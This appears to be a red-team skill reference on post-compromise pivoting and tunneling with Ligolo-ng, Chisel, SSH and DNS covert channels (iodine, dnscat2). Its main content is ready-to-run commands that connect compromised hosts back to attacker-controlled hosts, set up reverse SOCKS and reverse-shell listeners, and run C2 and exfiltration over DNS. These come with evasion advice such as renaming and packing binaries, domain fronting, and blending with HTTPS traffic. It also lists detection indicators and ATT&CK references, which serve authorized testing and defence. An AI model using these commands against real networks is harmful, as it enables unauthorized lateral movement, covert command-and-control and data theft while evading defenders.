# Pivoting, Tunneling & Network Segmentation Bypass

Turning one foothold into reachability across segments: Ligolo-ng (modern TUN-based),
Chisel (HTTP-wrapped SOCKS), SSH, and covert channels (DNS) when egress is filtered.

---

## 1. Ligolo-ng — TUN-based pivoting (preferred 2024-2026) ★ current

### Theory
Ligolo-ng builds a userland TCP/IP stack on the attacker via **gVisor netstack** and
exposes it as a **TUN interface**. Your OS routing table treats the internal subnet
as a real network — `nmap`, `nxc`, RDP clients, browsers all work natively, **no
proxychains**. A single yamux-multiplexed TLS connection carries everything (~106
Mbit/s on a 200 Mbit link in the project benchmarks), and the **agent needs no admin
rights** (only the attacker side needs root to make the TUN).

### Workflow (this skill's bootstrap script)
```bash
# Attacker: bring up TUN + start proxy (this skill):
bash scripts/pivot_autoroute.sh ligolo 0.0.0.0 11601
#   (creates 'ligolo' tun, then runs: ligolo-proxy -selfcert -laddr 0.0.0.0:11601)

# Compromised host (no admin needed):
./agent   -connect <ATTACKER_IP>:11601 -ignore-cert -retry      # Linux
agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert -retry      # Windows

# In the proxy console:
session            # pick the agent
autoroute          # v0.5+: auto-reads agent routes/interfaces & creates kernel routes
start              # bring up the tunnel
# (manual route if needed): sudo ip route add 10.10.0.0/16 dev ligolo
```
Now hit the internal net directly:
```bash
nmap -sT -Pn 10.10.0.0/24            # no proxychains; native through the TUN
nxc smb 10.10.0.5 -u user -p 'Pass'
xfreerdp /v:10.10.0.10 /u:admin
```

### v0.8 multiplayer / multi-pivot
- v0.8 adds a **web UI + REST API** ("multiplayer") — multiple agents from different
  segments attach to one proxy; `session` switches between them.
- **Double pivot:** agent-1 on the DMZ exposes 10.10.0.0/16; from a host reached via
  agent-1, run agent-2 → it dials the proxy *through* the first tunnel; add a route to
  the deeper subnet (172.16.0.0/16). For large multi-site engagements use **ligolo-mp**.
- **Listeners (reverse port-forward):** `listener_add --addr 0.0.0.0:1234 --to
  127.0.0.1:4444` lets an internal host reach your handler (reverse shells back).

### Detection
- Long-lived single TLS flow from an internal host to an external IP on an
  uncommon/443 port (yamux looks like opaque TLS to NDR). Self-signed cert if
  `-selfcert`. Beaconing-style persistence (`-retry`).
- IOC: `ligolo` TUN naming on the attacker; agent binary on disk (default name
  `agent`/`agent.exe` — rename it). NDR JA3/JA4 on the Go TLS stack.

### OPSEC
- No admin on target, single socket, multiplexed → low footprint vs N forwards.
- Run the proxy on **443** (`-laddr 0.0.0.0:443`) to blend with HTTPS egress; the
  agent's `-retry` survives link flaps. Known issue: memory leak under heavy nmap —
  scan in chunks. Cleanup: kill agent, `ip link del ligolo`.

---

## 2. Chisel — HTTP-wrapped SOCKS (egress-restricted nets)

### Theory
Chisel tunnels SOCKS over HTTP/WebSocket — survives proxies/DPI that only allow
"web" egress. Still fundamentally SOCKS → needs **proxychains**, no native
multi-pivot. Use when only HTTP egress is permitted or for a quick single forward.

```bash
# Attacker (reverse server) — this skill's helper prints the client line:
bash scripts/pivot_autoroute.sh chisel <ATTACKER_IP> 8080
#   == chisel server --reverse -p 8080

# Target -> reverse SOCKS back to attacker:
chisel client <ATTACKER_IP>:8080 R:1080:socks
# Encrypted + auth'd: add --auth user:pass and run server with --auth user:pass

# /etc/proxychains4.conf:  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 10.10.0.0/24
```
Chisel through a corporate proxy: `chisel client --proxy http://prox:8080 ...`.

### Detection / OPSEC
- HTTP framing overhead + periodic WebSocket keepalives are more fingerprintable than
  Ligolo's raw TLS. Run server behind an HTTPS reverse proxy / CDN domain-front to
  blend. Binary on disk = IOC; rename and pack. Cleanup: kill both ends.

---

## 3. SSH tunneling (when you have SSH creds/key)

```bash
ssh -N -D 127.0.0.1:1080 user@pivot        # dynamic SOCKS (proxychains)
ssh -L 8080:internal:80   user@pivot        # local forward (reach one service)
ssh -R 4444:localhost:4444 user@pivot        # reverse (callback through pivot)
ssh -J jump1,jump2 user@deep                 # ProxyJump chain (multi-hop)
# This skill's helper:
bash scripts/pivot_autoroute.sh ssh user pivot.internal
```
- **Double pivot via SSH:** from `pivot`, open another `-D` to the next hop; chain
  SOCKS in proxychains (`socks5 127.0.0.1 1080` then `socks5 127.0.0.1 2080`).
- Detection: SSH from an internal host outbound, or reverse forwards bound on the
  pivot (`ss -tlnp` shows the listener). OPSEC: SSH blends on Linux estates; on
  Windows, OpenSSH client usage by a service account is anomalous.

---

## 4. Covert channels — DNS / ICMP (deep egress restriction)

### DNS tunneling
When only DNS resolves outbound, tunnel IP over DNS (full connectivity) or run C2.
```bash
# iodine — full tun over DNS (you control NS for tunnel.attacker.com)
# server: iodined -f -c -P S3cret 10.0.0.1 tunnel.attacker.com
# client: iodine  -f    -P S3cret           tunnel.attacker.com
# -> tun interface, route traffic over DNS

# dnscat2 — C2/exfil over DNS (lower bandwidth, stealthier)
# server: ruby dnscat2.rb tunnel.attacker.com
# client: ./dnscat --dns server=tunnel.attacker.com,domain=tunnel.attacker.com
```
- Detection: high query volume / long random subdomains / high TXT/NULL ratio to one
  domain; NDR DNS-tunnel analytics (entropy, query length). OPSEC: throttle, use
  A/CNAME over TXT, jitter; very slow — exfil small data only.

### Proxychains chaining (general)
```ini
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080    # pivot 1 (DMZ)
socks5 127.0.0.1 2080    # pivot 2 (internal, reached through pivot 1)
# strict_chain (top of file) forces order
```

---

## Tool selection (2026 operator guidance)
| Need | Pick |
|---|---|
| Broad internal routing, scans, RDP, multi-pivot | **Ligolo-ng** (TUN, no proxychains) |
| Only HTTP egress allowed / quick single forward | **Chisel** (HTTP SOCKS) |
| Have SSH creds, Linux estate | **SSH** `-D`/`-J` |
| Only DNS resolves outbound | **iodine / dnscat2** |
| Complex multi-site, team engagement | **ligolo-mp** |
Common pattern: Chisel for first foothold → Ligolo-ng for lateral movement → ligolo-mp
for multi-site.

## References
- nicocha30/ligolo-ng GitHub (autoroute, v0.8 web UI / REST API, yamux/gVisor netstack,
  iperf benchmark).
- StationX / HackingArticles Ligolo-ng tutorials (2024-2025); morimori-dev
  "Chisel / Ligolo-ng / Ligolo-mp Practical Pivoting Guide (2026)."
- jpillora/chisel GitHub. MITRE ATT&CK T1090 (Proxy), T1090.001/.002 (Internal/External
  Proxy), T1572 (Protocol Tunneling), T1071.004 (DNS C2).
